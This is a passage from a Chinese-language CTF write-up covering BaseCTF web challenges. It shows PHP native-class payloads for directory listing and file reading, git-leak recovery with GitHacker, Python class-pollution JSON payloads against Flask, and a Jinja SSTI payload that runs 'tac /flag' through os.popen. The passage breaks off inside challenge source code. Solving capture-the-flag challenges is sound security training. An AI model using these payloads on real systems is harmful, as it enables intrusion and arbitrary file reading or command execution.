function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/f*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="flag直接读取不就行了？-php原生类"><a href="#flag直接读取不就行了？-php原生类" class="headerlink" title="flag直接读取不就行了？(php原生类)"></a>flag直接读取不就行了？(php原生类)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$J1ng</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Hong</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Keng</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$Wang</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$Keng</span><span class="token punctuation">(</span><span class="token variable">$Wang</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$J1ng</span><span class="token punctuation">(</span><span class="token variable">$Hong</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload</p><pre class="language-http" data-language="http"><code class="language-http">?K=DirectoryIterator&amp;W=/secret/?K=SplFileObject&amp;W=/secret/f11444g.php</code></pre><p><a href="https://www.anquanke.com/post/id/238482#h3-22">PHP 原生类在 CTF 中的利用</a></p><h4 id="Back-to-the-future-git泄露"><a href="#Back-to-the-future-git泄露" class="headerlink" title="Back to the future(git泄露)"></a>Back to the future(git泄露)</h4><p>推荐使用<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p><p>利用工具把这个项目拉下来</p><pre class="language-bash" data-language="bash"><code class="language-bash">githacker <span class="token parameter variable">--url</span> http://challenge.basectf.fun:49240/ <span class="token parameter variable">--output</span> back-future</code></pre><p>使用<code>git log</code>查看提交记录</p><p><img src="git.png" loading="lazy"></p><p>可以看到 <code>9d85f10e0192ef630e10d7f876a117db41c30417</code> 这个提交, 我们可以切到那一次提交</p><p><strong>切换到特定提交：</strong></p><p>你可以使用提交的哈希值 <strong><commit-hash></commit-hash></strong> 来切换到特定的提交状态。这将使你进入”分离头指针”状态，只能查看历史记录，而不能进行分支操作。通常情况下，不建议在分离头指针状态下工作，因为更改可能会丢失。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 9d85f10e0192ef630e10d7f876a117db41c30417</code></pre><p>或者</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog</code></pre><p><img src="git_2.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 9d85f10</code></pre><h4 id="圣钥之战1-0-python-原型链污染"><a href="#圣钥之战1-0-python-原型链污染" class="headerlink" title="圣钥之战1.0(python 原型链污染)"></a>圣钥之战1.0(python 原型链污染)</h4><p>&#x2F;read</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/static/index.html'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> f"J1ngHong说：你想read flag吗？那么圣钥之光必将阻止你！但是小小的源码没事，因为你也读不到flag<span class="token punctuation">(</span>乐<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span>"<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/pollute'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Pollution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>instance<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"J1ngHong说：钥匙圣洁无暇，无人可以污染！"</span>    <span class="token keyword">return</span> <span class="token string">"J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>看到index.html源码有张图片</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>J1ngHong's Message<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>J1ngHong说：这是圣钥，纯净无暇，不能污染，但是你可以去read那里找一下flag~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/1.jpeg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.jpeg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>此时<code>http://domain/static/xxx</code>只能访问到文件系统当前目录下<code>static</code>目录中的<code>xxx</code>文件，并且不存在如目录穿越的漏洞</p><p>污染该属性为当根目录。这样就能访问到根目录下的<code>flag</code>文件了</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/pollute</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:27598</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">59</span></span><span class="token application-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>官方wp</p><p>直接进&#x2F;read看源码，然后进&#x2F;flag进行post方法传参一个json的payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__file__"</span><span class="token operator">:</span><span class="token string">"/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>然后去&#x2F;read就有flag了。</p><p><a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体</a></p><p><a href="https://xz.aliyun.com/t/14620?u_atoken=65ddecfdc7f9515861cf73192c653805&u_asession=01tg4Re7x0Sqx3A9faMOrup1F3mTWuKaW_b83fFDALPOQjbSlByuTWDvmso5UJrutRJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05KUap-1IvBgPL8vv3yGCEzc48Q3oSFVi6MzLmEIrnKCHNj-TcUYd0qEjBQBggpCmBY4-dXw-Dff-QxyIWhBRxKivSQQy06u45IR3F7Ej5igWbWdYp_mc4TBTzDPCYHzJJHdqLK01P4bnw7O9Ygq_e03flitwL3Wj5Od6rPKqtngzBzhvSc0Kr8URjOX9Xe4tkTrTE5w3F08xyE75_wBFoikKIg66WHK8pgCdoRnyOQXTt782cQmBlQQJQ9IDcYv2cGsWAe-e_PYvPamjVaebg-CAqscTuE4GHrj-VNCf8HPd6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=8PtQL6DjIKQRdT5m/qOLtcLvayM=">从CISCN2024的sanic引发对python“原型链”的污染挖掘</a></p><p><a href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIeAK37KG=22BDRgibD#toc-6">浅谈Python原型链污染及利用方式</a></p><h4 id="Jinja-Mark-原型链污染-ssti"><a href="#Jinja-Mark-原型链污染-ssti" class="headerlink" title="Jinja Mark(原型链污染+ssti)"></a>Jinja Mark(原型链污染+ssti)</h4><p>访问index目录 是一个过滤了花括号的ssti注入 不过测试49 得到hint magic目录 要求传入json</p><p>访问flag目录 得到hint</p><pre class="language-php" data-language="php"><code class="language-php">你不会以为这里真的有flag吧？想要flag的话先猜猜我的幸运数字用<span class="token constant">POST</span>方式把 lucky_number 告诉我吧，只有四位数哦</code></pre><p>猜出幸运数字返回了 magic的源码 python原型链污染</p><pre class="language-python" data-language="python"><code class="language-python">BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/magic'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"这个魔术还行吧"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"我要json的魔术"</span>    <span class="token keyword">return</span> <span class="token string">"记得用POST方法把魔术交上来"</span></code></pre><p>这里对应的merge函数就是python中对属性值控制的一个操作，我们来简单的解释一下：merge中我们结合nodejs的merge来理解，就是将源参数赋值到目标参数。</p><p>然后对src中的键值对进行了遍历，然后检查dst中是否含有<code>__getitem__</code>属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值。</p><p>如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历。</p><p><strong>所以在&#x2F;magic路由下污染jinja的语法标识符，将”,“修改为”&lt;&lt;”,”&gt;&gt;”或者其他不影响ssti注入的符号，具体内容如下，传入后去&#x2F;index进行无过滤的ssti注入即可</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"&lt;&lt;"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">">>"</span><span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>修改后正常ssti即可 大部分都没有ban</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">=</span><span class="token operator">&lt;&lt;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span></code></pre><h4 id="Lucky-Number-原型链污染plus"><a href="#Lucky-Number-原型链污染plus" class="headerlink" title="Lucky Number(原型链污染plus)"></a>Lucky Number(原型链污染plus)</h4><p>访问flag目录得到</p><pre class="language-python" data-language="python"><code class="language-python">你不会以为这里真的有flag吧？想要flag的话先提交我的幸运数字<span class="token number">5346</span>但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去<span class="token operator">/</span>m4G1c里尝试着接触到这个方法下面是前人留下来的信息，希望对你有用<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">import</span> json<span class="token keyword">import</span> heaven<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span>BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/m4G1c'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>            result <span class="token operator">=</span> heaven<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>            message <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> "这个魔术还行吧" <span class="token operator">+</span> message        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"我要json的魔术"</span>    <span class="token keyword">return</span> <span class="token string">"记得用POST方法把魔术交上来"</span><span class="token comment">#heaven.py</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>kon<span class="token operator">=</span><span class="token string">"Kon"</span><span class="token punctuation">,</span> pure<span class="token operator">=</span><span class="token string">"Pure"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> confirm<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"这是你的lucky_number，请拿好，去/check下检查一下吧"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">[</span><span class="token string">"lucky_number"</span><span class="token punctuation">]</span><span class="token 